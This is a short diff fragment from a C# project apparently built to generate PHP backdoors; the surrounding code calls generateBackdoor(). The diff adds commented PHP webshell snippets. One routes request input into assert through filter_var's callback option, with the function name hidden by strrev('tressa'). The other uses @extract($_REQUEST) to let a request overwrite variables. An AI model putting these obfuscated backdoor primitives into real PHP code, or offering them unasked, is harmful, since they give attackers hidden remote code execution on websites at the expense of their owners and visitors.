@@ -39,6 +39,10 @@ namespace bantam_php
             richTextBoxBackdoor.Text = generateBackdoor();
         }
 
+       //filter_var($_REQUEST['test'], FILTER_CALLBACK, array("options" => strrev("tressa")));
+
+       //@extract($_REQUEST); ...
+
         /// <summary>
         /// 
         /// </summary>
